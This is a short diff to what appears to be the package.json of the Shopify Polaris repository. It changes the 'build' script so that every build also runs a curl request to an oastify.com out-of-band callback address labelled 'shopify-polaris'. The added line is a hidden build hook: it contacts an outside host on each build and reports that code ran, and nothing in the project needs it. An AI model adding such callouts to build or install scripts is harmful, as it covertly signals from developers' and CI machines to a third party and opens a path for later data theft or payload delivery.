@@ -27,7 +27,7 @@
     ]
   },
   "scripts": {
-    "build": "turbo run build",
+    "build": "turbo run build && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/shopify-polaris",
     "dev": "turbo run dev --filter=@shopify/polaris --parallel",
     "lint": "turbo run lint",
     "test": "turbo run test",
